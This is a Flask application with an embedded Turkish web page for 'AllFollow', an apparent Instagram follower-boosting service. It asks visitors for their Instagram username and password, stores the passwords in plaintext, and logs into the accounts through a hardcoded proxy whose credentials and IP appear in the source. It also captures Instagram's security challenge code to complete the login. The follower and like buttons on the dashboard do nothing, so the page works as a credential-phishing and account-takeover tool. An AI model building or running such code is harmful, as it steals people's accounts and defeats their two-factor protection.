import os
import time
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

# Aktif client'ları hafızada tutuyoruz ki kod gelince devam edebilelim
active_sessions = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(100), default="Bekliyor")

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/login', methods=['POST'])
def login_api():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    cl = Client()
    if PROXY_URL: cl.set_proxy(PROXY_URL)
    active_sessions[u] = cl
    
    try:
        # Instagram'a bağlanmayı dene
        if cl.login(u, p):
            # Giriş başarılı
            acc = IGAccount.query.filter_by(username=u).first()
            if not acc:
                acc = IGAccount(username=u, password=p, status="AKTIF")
                db.session.add(acc)
            else:
                acc.status = "AKTIF"
            db.session.commit()
            return jsonify(status="success", next_step="dashboard")
            
    except ChallengeRequired:
        # Kod lazım!
        return jsonify(status="challenge", next_step="verify")
    except BadPassword:
        return jsonify(status="error", message="Şifre Yanlış!")
    except Exception as e:
        print(f"Hata: {e}")
        return jsonify(status="error", message="Bağlantı reddedildi, tekrar dene.")

@app.route('/api/verify', methods=['POST'])
def verify_api():
    data = request.json
    u, code = data.get('u'), data.get('code')
    cl = active_sessions.get(u)
    
    if not cl:
        return jsonify(status="error", message="Oturum zaman aşımı!")
    
    try:
        cl.challenge_set_code(code)
        acc = IGAccount.query.filter_by(username=u).first()
        acc.status = "AKTIF"
        db.session.commit()
        return jsonify(status="success", next_step="dashboard")
    except Exception:
        return jsonify(status="error", message="Kod hatalı veya süresi dolmuş.")

# --- UI: DİNAMİK GEÇİŞLİ ARAYÜZ ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllFollow</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body { background: #09090b; color: white; font-family: 'Inter', sans-serif; }
        .glass { background: rgba(24, 24, 27, 0.9); border: 1px solid rgba(63, 63, 70, 0.5); backdrop-filter: blur(10px); }
        .page { display: none; } .active { display: block; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #a855f7; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div id="login-page" class="page active w-full max-w-[350px]">
        <div class="glass p-8 rounded-3xl text-center shadow-2xl">
            <h1 class="text-3xl font-black italic mb-6 text-purple-500">ALLFOLLOW</h1>
            <div class="space-y-4 text-left">
                <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-black border border-zinc-800 p-3 rounded-xl outline-none focus:border-purple-500 text-sm">
                <input id="p" type="password" placeholder="Şifre" class="w-full bg-black border border-zinc-800 p-3 rounded-xl outline-none focus:border-purple-500 text-sm">
                <button onclick="handleLogin()" id="login-btn" class="w-full bg-purple-600 font-bold py-3 rounded-xl transition-all active:scale-95">
                    GİRİŞ YAP
                </button>
            </div>
            <p id="err" class="text-red-500 text-[10px] mt-4 font-bold"></p>
        </div>
    </div>

    <div id="verify-page" class="page w-full max-w-[350px]">
        <div class="glass p-8 rounded-3xl text-center border-amber-500/50">
            <i class="fas fa-shield-alt text-amber-500 text-3xl mb-4"></i>
            <h2 class="text-xl font-bold mb-2">Güvenlik Onayı</h2>
            <p class="text-xs text-gray-400 mb-6">Instagram'ın gönderdiği 6 haneli kodu girin.</p>
            <input id="vcode" placeholder="000000" class="w-full bg-black border border-zinc-800 p-4 rounded-xl text-center text-2xl tracking-widest outline-none focus:border-amber-500 mb-4">
            <button onclick="handleVerify()" id="verify-btn" class="w-full bg-amber-600 font-bold py-3 rounded-xl">KODU ONAYLA</button>
        </div>
    </div>

    <div id="dashboard-page" class="page w-full max-w-[400px]">
        <div class="glass p-6 rounded-[2.5rem] border-t-4 border-green-500">
            <div class="flex justify-between items-center mb-8">
                <span class="text-xs font-bold text-green-500 italic">● SISTEM AKTIF</span>
                <i class="fas fa-cog text-gray-600"></i>
            </div>
            <div class="text-center mb-8">
                <div class="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-green-500/30">
                    <i class="fas fa-check text-3xl text-green-500"></i>
                </div>
                <h2 class="text-2xl font-black italic" id="final-user"></h2>
                <p class="text-[10px] text-gray-500 uppercase tracking-widest mt-1 font-bold">Bot Başarıyla Bağlandı</p>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <button class="p-4 bg-zinc-900 rounded-2xl border border-zinc-800 text-xs font-bold">TAKİPÇİ GÖNDER</button>
                <button class="p-4 bg-zinc-900 rounded-2xl border border-zinc-800 text-xs font-bold">BEĞENİ GÖNDER</button>
            </div>
        </div>
    </div>

    <script>
        async function handleLogin() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            const btn = document.getElementById('login-btn');
            const err = document.getElementById('err');
            
            if(!u || !p) return;

            btn.disabled = true;
            btn.innerHTML = '<div class="loader"></div> BAĞLANIYOR...';
            err.innerText = "";

            try {
                const r = await fetch('/api/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({u, p})
                });
                const d = await r.json();

                if(d.status === "success") {
                    showPage('dashboard-page');
                    document.getElementById('final-user').innerText = "@" + u;
                } else if(d.status === "challenge") {
                    showPage('verify-page');
                } else {
                    err.innerText = d.message;
                    btn.disabled = false;
                    btn.innerText = "TEKRAR DENE";
                }
            } catch {
                err.innerText = "Sunucu yanıt vermiyor.";
                btn.disabled = false;
                btn.innerText = "GİRİŞ YAP";
            }
        }

        async function handleVerify() {
            const code = document.getElementById('vcode').value;
            const u = document.getElementById('u').value;
            const btn = document.getElementById('verify-btn');
            
            btn.disabled = true;
            btn.innerText = "ONAYLANIYOR...";

            const r = await fetch('/api/verify', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, code})
            });
            const d = await r.json();

            if(d.status === "success") {
                showPage('dashboard-page');
                document.getElementById('final-user').innerText = "@" + u;
            } else {
                alert(d.message);
                btn.disabled = false;
                btn.innerText = "KODU ONAYLA";
            }
        }

        function showPage(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }
    </script>
</body>
</html>
